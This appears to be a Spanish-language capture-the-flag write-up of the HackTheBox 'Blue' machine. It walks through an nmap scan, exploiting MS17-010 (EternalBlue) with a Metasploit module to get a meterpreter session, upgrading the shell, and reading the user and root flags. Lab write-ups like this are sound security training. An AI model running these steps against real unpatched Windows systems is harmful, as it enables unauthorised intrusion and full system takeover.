+++ 
draft = false
date = 2026-01-10T03:29:08Z
title = "Blue Machine - HackTheBox"
description = "Esta es una máquina Windows de nivel fácil de la plataforma HackTheBox"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Windows #Eternalblue #metasploit 
----------------
# Enumeración Nmap

**Comando:**

```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.10.40 -oG allPorts
```
En el escaneo nos dice el SO:`Windows 7 professional 7601

<img src="/images/Pasted image 20251104120942.png" style="width:100%; height:auto; display:block; margin:auto;">

Si buscamos por vulnerabilidades para la versión de SO, nos aparece MS17-010, y post relacionados con eternalblue

<img src="/images/Pasted image 20251104121005.png" style="width:100%; height:auto; display:block; margin:auto;">

# Explotamos SMB

Por tanto utilizaremos metasploit para buscar algún modulo de eternalblue

Hacemos un

```bash
msfconsole
search eternal
```
y nos aparecen las siguientes opciones, usaremos la opción 2

<img src="/images/Pasted image 20251104121151.png" style="width:100%; height:auto; display:block; margin:auto;">

```bash
use 2
show options
```

En las opciones debemos poner el `RHOSTS` y `LPORT`

<img src="/images/Pasted image 20251104121257.png" style="width:100%; height:auto; display:block; margin:auto;">

Y luego le damos a `run` y conseguimos una session de meterpreter

<img src="/images/Pasted image 20251104121632.png" style="width:100%; height:auto; display:block; margin:auto;">

# Tratamos la consola

Usamos los siguientes comandos

```bash
background
search shell_to_meterpreter
use 0
```

<img src="/images/Pasted image 20251104121917.png" style="width:100%; height:auto; display:block; margin:auto;">

Usamos la session 1 y le damos a run

```bash
set SESSION 1
run
```

Utilizamos `sessions -l` para ver las sessiones y utilizamos `session -i 2` para escogerla

<img src="/images/Pasted image 20251104122609.png" style="width:100%; height:auto; display:block; margin:auto;">

Usamos una shell y vemos que tenemos priv de admin

<img src="/images/Pasted image 20251104122633.png" style="width:100%; height:auto; display:block; margin:auto;">

# Flag de user

Para obtener la flag de `user.txt` la buscamos con el siguiente comando

```bash
cd \
dir "user.txt" /s /b
type C:\Users\haris\Desktop\user.txt
```

# Flag de root

Para obtener la flag de altos privilegios `root.txt` utilizamos

```bash
cd \
dir "root.txt" /s /b
type C:\Users\Administrator\Desktop\root.txt
```

<img src="/images/Pasted image 20251104122934.png" style="width:100%; height:auto; display:block; margin:auto;">
